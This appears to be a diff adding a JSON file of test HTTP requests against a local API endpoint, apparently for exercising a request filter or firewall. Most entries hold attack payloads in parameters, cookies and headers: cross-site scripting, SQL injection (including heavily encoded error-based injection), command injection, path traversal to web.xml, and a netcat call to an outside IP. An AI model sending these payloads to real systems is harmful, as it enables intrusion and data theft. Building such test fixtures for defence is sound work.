@@ -1,0 +1,83 @@
+[
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "POST",
+        "data" : {
+            "param1" : "aajsvfawuegfuaewfbasbcjasvd gqvuefgqwbcqvciqewvufqvcqwvcutqwvucv    wuvcuvwcuiwvc sabcdkydkycascdbaksbcaavyawbaewbycqwbc",
+            "param2" : "Hello"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "data" : {
+            "param1" : "aajsvfawuegfuaewfbasbcjasvd gqvuefgqwbcqvciqewvufqvcqwvcutqwvucv    wuvcuvwcuiwvc sabcdkydkycascdbaksbcaavyawbaewbycqwbc",
+            "param2" : "Hello"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "data" : {
+            "param1" : "Hi",
+            "param2" : "Hello"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "POST",
+        "data" : {
+            "param1" : "<ol onbeforepaste=\"alert(1)\" contenteditable>test</ol>",
+            "param2" : "Hello"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "cookies" : {
+            "c1" : "<ol onbeforepaste=\"alert(1)\" contenteditable>test</ol>"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "params" : {
+            "param1" : "-9265\") or 7834=1685"
+        },
+        "cookies" : {
+            "c1" : "<ol onbeforepaste=\"alert(1)\" contenteditable>test</ol>"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "headers" : {
+            "user-agent" : "/scripts/file.bat\" \"& dir c:/ .exe"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "headers" : {
+            "accept-encoding" : "/....//....//web-inf/web.xml"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "GET",
+        "cookies" : {
+            "c1" : "%25252F....%25252F%25252F....%25252F%25252Fweb-inf%25252Fweb.xml"
+        }
+    },
+    {
+        "url" : "http://127.0.0.1:5000/srs/api/hello/test",
+        "method" : "POST",
+        "data" : {
+            "param1" : "1%25252529%25252Bor%25252B%25252528select%25252B9173%25252Bfrom%25252528select%25252Bcount%25252528%2525252A%25252529%2525252Cconcat%252525280x7171706a71%2525252C%25252528select%25252B%25252528elt%252525289173%2525253D9173%2525252C1%25252529%25252529%25252529%2525252C0x717a767a71%2525252Cfloor%25252528rand%252525280%25252529%2525252A2%25252529%25252529x%25252Bfrom%25252Binformation_schema.character_sets%25252Bgroup%25252Bby%25252Bx%25252529a%25252529%25252Band%25252B%252525287984%2525253D7984",
+            "param2" : "Hello"
+        },
+        "headers" : {
+            "accept-encoding" : "'orts%3D%7C+%2Fusr%2Fbin%2Fnc+-vvv+94.116.216.61+80%00%3Bwsj8tcg-xdio%3Dii'"
+        }
+    }
+]
